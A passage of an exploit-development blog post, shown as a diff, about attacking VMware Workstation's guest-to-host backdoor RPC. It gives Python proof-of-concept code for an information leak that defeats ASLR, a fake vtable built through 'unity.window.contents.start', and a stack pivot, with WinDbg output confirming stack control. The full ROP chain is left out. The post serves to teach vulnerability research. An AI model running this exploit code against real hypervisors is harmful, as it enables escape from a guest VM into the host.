+<a id="__codelineno-24-2" name="__codelineno-24-2"></a>    <span class="n">buf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3"></a>    <span class="n">vmwareBase</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4"></a>    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5"></a>        <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000</span><span class="p">)</span>
+<a id="__codelineno-24-6" name="__codelineno-24-6"></a>        <span class="n">bphb</span> <span class="o">=</span> <span class="n">BACKDOOR_PROTO_HB</span><span class="p">()</span>
+<a id="__codelineno-24-7" name="__codelineno-24-7"></a>
+<a id="__codelineno-24-8" name="__codelineno-24-8"></a>        <span class="n">bphb</span><span class="o">.</span><span class="n">cx</span> <span class="o">=</span> <span class="mh">0x8000</span>
+<a id="__codelineno-24-9" name="__codelineno-24-9"></a>        <span class="n">bphb</span><span class="o">.</span><span class="n">di</span> <span class="o">=</span> <span class="n">buf</span>
+<a id="__codelineno-24-10" name="__codelineno-24-10"></a>        <span class="n">bphb</span><span class="o">.</span><span class="n">bx</span> <span class="o">=</span> <span class="mi">2</span>
+<a id="__codelineno-24-11" name="__codelineno-24-11"></a>
+<a id="__codelineno-24-12" name="__codelineno-24-12"></a>        <span class="n">Backdoor_HbIn</span><span class="p">(</span><span class="n">bphb</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>The code is very simple. We issue a high-bandwidth backdoor request with an invalid command specified in EBX, and we supply a large output buffer in RDI. When the call takes place, VMWare stores some temporary data in the output buffer and as mentioned before, when the command fails and returns the application forgets to clear the output buffer, thus resulting in an information leak condition.</p>
+<p>Once we've obtained the raw data we need some way of filtering it. We are specifically looking to gather pointers that we can use in order to bypass ASLR. Since leaks are not often that reliable, and we know the starting value and ending value of the VMWare base address, we'll ensure that our leak continues to execute until those characters are found in the response.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
+<span class="normal"><a href="#__codelineno-25-2">2</a></span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span>
+<span class="normal"><a href="#__codelineno-25-4">4</a></span>
+<span class="normal"><a href="#__codelineno-25-5">5</a></span>
+<span class="normal"><a href="#__codelineno-25-6">6</a></span>
+<span class="normal"><a href="#__codelineno-25-7">7</a></span>
+<span class="normal"><a href="#__codelineno-25-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="n">Pointer</span> <span class="o">=</span> <span class="n">cast</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x7ef0</span><span class="p">,</span> <span class="n">POINTER</span><span class="p">(</span><span class="n">c_ulonglong</span><span class="p">))</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2"></a>        <span class="n">vmwarePointer</span> <span class="o">=</span> <span class="n">Pointer</span><span class="o">.</span><span class="n">contents</span><span class="o">.</span><span class="n">value</span>
+<a id="__codelineno-25-3" name="__codelineno-25-3"></a>
+<a id="__codelineno-25-4" name="__codelineno-25-4"></a>        <span class="k">if</span> <span class="n">vmwarePointer</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFF000000000</span> <span class="o">==</span> <span class="mh">0x7ff000000000</span><span class="p">:</span>
+<a id="__codelineno-25-5" name="__codelineno-25-5"></a>            <span class="k">if</span> <span class="n">vmwarePointer</span> <span class="o">&amp;</span> <span class="mh">0x000000000000FFFF</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-25-6" name="__codelineno-25-6"></a>                <span class="n">vmwareBase</span> <span class="o">=</span> <span class="n">vmwarePointer</span>
+<a id="__codelineno-25-7" name="__codelineno-25-7"></a>                <span class="k">break</span>
+<a id="__codelineno-25-8" name="__codelineno-25-8"></a>    <span class="k">return</span> <span class="n">vmwareBase</span>
+</code></pre></div></td></tr></table></div>
+<p>If we execute this proof of concept, after a short while of waiting we will eventually receive the vmware_vmx base address which we can then use in order to build our ROP chain.</p>
+<h1 id="stack-pivot">Stack Pivot<a class="headerlink" href="#stack-pivot" title="Permanent link">&para;</a></h1>
+<p>Before we can build our ROP chain, we still require control of the stack. To obtain that control we are going to employ the common technique of stack pivoting. Unfortunately in this case, no stack pivot gadget stands out right away so we will need to think creatively about how to achieve this.</p>
+<p>If we run our reallocation POC multiple times we notice that RDI (which points to data we control) always gets allocated at an address below 0x100000000. Values below this number are possible to fit into 32-bit subregisters, which means that if we can find a gadget such as the one shown below:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
+<span class="normal"><a href="#__codelineno-26-2">2</a></span>
+<span class="normal"><a href="#__codelineno-26-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1"></a>0:012&gt; u vmware_vmx+183429 L4
+<a id="__codelineno-26-2" name="__codelineno-26-2"></a>vmware_vmx+0x183429:
+<a id="__codelineno-26-3" name="__codelineno-26-3"></a>00007ff6`14e63429 8be7      mov     esp,edi
+</code></pre></div></td></tr></table></div>
+<p>Then we could use it to pivot the stack and thus gain the necessary control to begin our ROP chain. RDI points to the "dnd.setGuestFileRoot" argument string, and this address will always fit into the lower 32-bits of RDI.</p>
+<p>To take advantage of this gadget, we need to write its address to the global variable that we control via the RPC commmand "unity.window.contents.start". Then we can modify the "MessageSendData" reallocation request to craft a fake vtable. Our crafted vtable will contain the pivot gadget address as the second virtual function pointer. We update our proof of concept as follows.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-27-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-27-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-27-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-27-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-27-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-27-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-27-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-27-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-27-10">10</a></span>
+<span class="normal"><a href="#__codelineno-27-11">11</a></span>
+<span class="normal"><a href="#__codelineno-27-12">12</a></span>
+<span class="normal"><a href="#__codelineno-27-13">13</a></span>
+<span class="normal"><a href="#__codelineno-27-14">14</a></span>
+<span class="normal"><a href="#__codelineno-27-15">15</a></span>
+<span class="normal"><a href="#__codelineno-27-16">16</a></span>
+<span class="normal"><a href="#__codelineno-27-17">17</a></span>
+<span class="normal"><a href="#__codelineno-27-18">18</a></span>
+<span class="normal"><a href="#__codelineno-27-19">19</a></span>
+<span class="normal"><a href="#__codelineno-27-20">20</a></span>
+<span class="normal"><a href="#__codelineno-27-21">21</a></span>
+<span class="normal"><a href="#__codelineno-27-22">22</a></span>
+<span class="normal"><a href="#__codelineno-27-23">23</a></span>
+<span class="normal"><a href="#__codelineno-27-24">24</a></span>
+<span class="normal"><a href="#__codelineno-27-25">25</a></span>
+<span class="normal"><a href="#__codelineno-27-26">26</a></span>
+<span class="normal"><a href="#__codelineno-27-27">27</a></span>
+<span class="normal"><a href="#__codelineno-27-28">28</a></span>
+<span class="normal"><a href="#__codelineno-27-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="k">def</span> <span class="nf">realloc</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2"></a>    <span class="nb">print</span> <span class="s2">&quot;Address supplied is: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+<a id="__codelineno-27-3" name="__codelineno-27-3"></a>    <span class="n">inbuf</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">)</span>
+<a id="__codelineno-27-4" name="__codelineno-27-4"></a>    <span class="n">memset</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
+<a id="__codelineno-27-5" name="__codelineno-27-5"></a>    <span class="n">pointer</span> <span class="o">=</span> <span class="n">c_ulonglong</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+<a id="__codelineno-27-6" name="__codelineno-27-6"></a>    <span class="n">memmove</span><span class="p">(</span><span class="n">inbuf</span><span class="p">,</span> <span class="n">addressof</span><span class="p">(</span><span class="n">pointer</span><span class="p">),</span> <span class="mh">0x8</span><span class="p">)</span>
+<a id="__codelineno-27-7" name="__codelineno-27-7"></a>
+<a id="__codelineno-27-8" name="__codelineno-27-8"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x40</span><span class="p">):</span>
+<a id="__codelineno-27-9" name="__codelineno-27-9"></a>        <span class="n">chan</span> <span class="o">=</span> <span class="n">MESSAGE_CHANNEL</span><span class="p">()</span>
+<a id="__codelineno-27-10" name="__codelineno-27-10"></a>        <span class="n">OpenChannel</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+<a id="__codelineno-27-11" name="__codelineno-27-11"></a>        <span class="n">MessageSendSize</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">)</span>
+<a id="__codelineno-27-12" name="__codelineno-27-12"></a>        <span class="n">MessageSendData</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">inbuf</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">)</span>
+<a id="__codelineno-27-13" name="__codelineno-27-13"></a>        <span class="n">MessageClose</span><span class="p">(</span><span class="n">chan</span><span class="p">)</span>
+<a id="__codelineno-27-14" name="__codelineno-27-14"></a>
+<a id="__codelineno-27-15" name="__codelineno-27-15"></a><span class="k">def</span> <span class="nf">fakeVFTable</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+<a id="__codelineno-27-16" name="__codelineno-27-16"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="n">create_string_buffer</span><span class="p">(</span><span class="s2">&quot;unity.window.contents.start AAAABBBBCCCCDDDDEEEEFFFF&quot;</span><span class="p">)</span>
+<a id="__codelineno-27-17" name="__codelineno-27-17"></a>    <span class="n">size</span> <span class="o">=</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+<a id="__codelineno-27-18" name="__codelineno-27-18"></a>    <span class="n">fakeAddr</span> <span class="o">=</span> <span class="n">addr</span>
+<a id="__codelineno-27-19" name="__codelineno-27-19"></a>
+<a id="__codelineno-27-20" name="__codelineno-27-20"></a>    <span class="n">RpcSendRequest</span><span class="p">(</span><span class="n">addressof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span> <span class="n">size</span><span class="p">,</span> <span class="n">outbuf</span><span class="p">,</span> <span class="n">pointer</span><span class="p">(</span><span class="n">outLen</span><span class="p">))</span>
+<a id="__codelineno-27-21" name="__codelineno-27-21"></a>
+<a id="__codelineno-27-22" name="__codelineno-27-22"></a>
+<a id="__codelineno-27-23" name="__codelineno-27-23"></a><span class="n">vmwareBase</span> <span class="o">=</span> <span class="n">leak</span><span class="p">()</span>
+<a id="__codelineno-27-24" name="__codelineno-27-24"></a>
+<a id="__codelineno-27-25" name="__codelineno-27-25"></a><span class="c1"># vmwareBase + 0x183429 = Pivot gadget Addr</span>
+<a id="__codelineno-27-26" name="__codelineno-27-26"></a><span class="n">fakeVFTable</span><span class="p">(</span><span class="n">vmwareBase</span> <span class="o">+</span> <span class="mh">0x183429</span><span class="p">)</span>
+<a id="__codelineno-27-27" name="__codelineno-27-27"></a>
+<a id="__codelineno-27-28" name="__codelineno-27-28"></a><span class="c1"># vmwareBase + 0xb870f8 = Fake vtable Addr</span>
+<a id="__codelineno-27-29" name="__codelineno-27-29"></a><span class="n">realloc</span><span class="p">(</span><span class="n">vmwareBase</span> <span class="o">+</span> <span class="mh">0xb870f8</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>We'll place a breakpoint on the call instruction which causes the access violation and we'll follow the execution so we can verify that the stack pivot takes place.</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-28-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-28-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-28-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-28-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-28-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-28-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-28-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-28-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-28-10">10</a></span>
+<span class="normal"><a href="#__codelineno-28-11">11</a></span>
+<span class="normal"><a href="#__codelineno-28-12">12</a></span>
+<span class="normal"><a href="#__codelineno-28-13">13</a></span>
+<span class="normal"><a href="#__codelineno-28-14">14</a></span>
+<span class="normal"><a href="#__codelineno-28-15">15</a></span>
+<span class="normal"><a href="#__codelineno-28-16">16</a></span>
+<span class="normal"><a href="#__codelineno-28-17">17</a></span>
+<span class="normal"><a href="#__codelineno-28-18">18</a></span>
+<span class="normal"><a href="#__codelineno-28-19">19</a></span>
+<span class="normal"><a href="#__codelineno-28-20">20</a></span>
+<span class="normal"><a href="#__codelineno-28-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1"></a>Breakpoint 0 hit
+<a id="__codelineno-28-2" name="__codelineno-28-2"></a>vmware_vmx+0x9d0b2:
+<a id="__codelineno-28-3" name="__codelineno-28-3"></a>00007ff6`3d4fd0b2 ff5008          call    qword ptr [rax+8] ds:00007ff6`3dfe7100=00007ff63d5e3429
+<a id="__codelineno-28-4" name="__codelineno-28-4"></a>
+<a id="__codelineno-28-5" name="__codelineno-28-5"></a>0:013&gt; u 00007ff63d5e3429 L4
+<a id="__codelineno-28-6" name="__codelineno-28-6"></a>vmware_vmx+0x183429:
+<a id="__codelineno-28-7" name="__codelineno-28-7"></a>00007ff6`3d5e3429 8be7            mov     esp,edi
+<a id="__codelineno-28-8" name="__codelineno-28-8"></a>00007ff6`3d5e342b 6500c3          add     bl,al
+<a id="__codelineno-28-9" name="__codelineno-28-9"></a>00007ff6`3d5e342e 488d05d3b16500  lea     rax,[vmware_vmx!opus_get_version_string+0xb36a8 (00007ff6`3dc3e608)]
+<a id="__codelineno-28-10" name="__codelineno-28-10"></a>00007ff6`3d5e3435 c3              ret
+<a id="__codelineno-28-11" name="__codelineno-28-11"></a>
+<a id="__codelineno-28-12" name="__codelineno-28-12"></a>0:013&gt; t
+<a id="__codelineno-28-13" name="__codelineno-28-13"></a>vmware_vmx+0x183429:
+<a id="__codelineno-28-14" name="__codelineno-28-14"></a>00007ff6`3d5e3429 8be7            mov     esp,edi
+<a id="__codelineno-28-15" name="__codelineno-28-15"></a>
+<a id="__codelineno-28-16" name="__codelineno-28-16"></a>0:013&gt; p
+<a id="__codelineno-28-17" name="__codelineno-28-17"></a>vmware_vmx+0x18342b:
+<a id="__codelineno-28-18" name="__codelineno-28-18"></a>00007ff6`3d5e342b 6500c3          add     bl,al
+<a id="__codelineno-28-19" name="__codelineno-28-19"></a>
+<a id="__codelineno-28-20" name="__codelineno-28-20"></a>0:013&gt; db esp L5
+<a id="__codelineno-28-21" name="__codelineno-28-21"></a>00000000`04411ce5  42 42 42 42 42                                   BBBBB
+</code></pre></div></td></tr></table></div>
+<p>Clearly, we have managed to gain control over the stack and we can now build a ROP chain in order to bypass DEP.</p>
+<h1 id="building-a-rop-chain">Building a ROP Chain<a class="headerlink" href="#building-a-rop-chain" title="Permanent link">&para;</a></h1>
+<p>We are going to use GetModuleHandle and GetProcAddress in order to dynamically resolve addresses and consequently dynmically resolve the address for WriteProcessMemory.</p>
+<p>For the sake of brevity, I am not going to include an entire ROP chain here. You can find examples online of ROP chains for this exploit so go try it! You'll learn a lot as there are some issues you'll run into!</p>
+<p>Hope you enjoy :)</p>
+
+  
+  
+
+
+
+
+  
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../../2019/2019-12-8-BAE-ctf-crypto3/" class="md-footer__link md-footer__link--prev" aria-label="Previous: BAE x BSides Chelt CTF" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              BAE x BSides Chelt CTF
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../2022/2022-05-14-HEVD3-StackOverflow/" class="md-footer__link md-footer__link--next" aria-label="Next: HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs Insiders
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/linxzsec" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/linxzsec" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://gitlab.com/linxzsec" target="_blank" rel="noopener" title="gitlab.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="m503.5 204.6-.7-1.8-69.7-181.78c-1.4-3.57-3.9-6.59-7.2-8.64-2.4-1.55-5.1-2.515-8-2.81-2.9-.295-5.7.083-8.4 1.11-2.7 1.02-5.1 2.66-7.1 4.78-1.9 2.12-3.3 4.67-4.1 7.44l-47 144H160.8l-47.1-144c-.8-2.77-2.2-5.31-4.1-7.43-2-2.12-4.4-3.75-7.1-4.77a18.1 18.1 0 0 0-8.38-1.113 18.4 18.4 0 0 0-8.04 2.793 18.09 18.09 0 0 0-7.16 8.64L9.267 202.8l-.724 1.8a129.57 129.57 0 0 0-3.52 82c7.747 26.9 24.047 50.7 46.447 67.6l.27.2.59.4 105.97 79.5 52.6 39.7 32 24.2c3.7 1.9 8.3 4.3 13 4.3 4.7 0 9.3-2.4 13-4.3l32-24.2 52.6-39.7 106.7-79.9.3-.3c22.4-16.9 38.7-40.6 45.6-67.5 8.6-27 7.4-55.8-2.6-82z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://keybase.io/linxz" target="_blank" rel="noopener" title="keybase.io" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M286.17 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18zm111.92-147.6c-9.5-14.62-39.37-52.45-87.26-73.71q-9.1-4.06-18.38-7.27a78.43 78.43 0 0 0-47.88-104.13c-12.41-4.1-23.33-6-32.41-5.77-.6-2-1.89-11 9.4-35L198.66 32l-5.48 7.56c-8.69 12.06-16.92 23.55-24.34 34.89a51 51 0 0 0-8.29-1.25c-41.53-2.45-39-2.33-41.06-2.33-50.61 0-50.75 52.12-50.75 45.88l-2.36 36.68c-1.61 27 19.75 50.21 47.63 51.85l8.93.54a214 214 0 0 0-46.29 35.54C14 304.66 14 374 14 429.77v33.64l23.32-29.8a148.6 148.6 0 0 0 14.56 37.56c5.78 10.13 14.87 9.45 19.64 7.33 4.21-1.87 10-6.92 3.75-20.11a178.29 178.29 0 0 1-15.76-53.13l46.82-59.83-24.66 74.11c58.23-42.4 157.38-61.76 236.25-38.59 34.2 10.05 67.45.69 84.74-23.84.72-1 1.2-2.16 1.85-3.22a156.09 156.09 0 0 1 2.8 28.43c0 23.3-3.69 52.93-14.88 81.64-2.52 6.46 1.76 14.5 8.6 15.74 7.42 1.57 15.33-3.1 18.37-11.15C429 443 434 414 434 382.32c0-38.58-13-77.46-35.91-110.92zM142.37 128.58l-15.7-.93-1.39 21.79 13.13.78a93 93 0 0 0 .32 19.57l-22.38-1.34a12.28 12.28 0 0 1-11.76-12.79L107 119c1-12.17 13.87-11.27 13.26-11.32l29.11 1.73a144.35 144.35 0 0 0-7 19.17zm148.42 172.18a10.51 10.51 0 0 1-14.35-1.39l-9.68-11.49-34.42 27a8.09 8.09 0 0 1-11.13-1.08l-15.78-18.64a7.38 7.38 0 0 1 1.34-10.34l34.57-27.18-14.14-16.74-17.09 13.45a7.75 7.75 0 0 1-10.59-1s-3.72-4.42-3.8-4.53a7.38 7.38 0 0 1 1.37-10.34L214 225.19s-18.51-22-18.6-22.14a9.56 9.56 0 0 1 1.74-13.42 10.38 10.38 0 0 1 14.3 1.37l81.09 96.32a9.58 9.58 0 0 1-1.74 13.44zM187.44 419a18 18 0 1 0 18 18 18 18 0 0 0-18-18z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "search.suggest", "search.highlight", "navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.top", "content.code.annotate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.4a0e3b6c.min.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
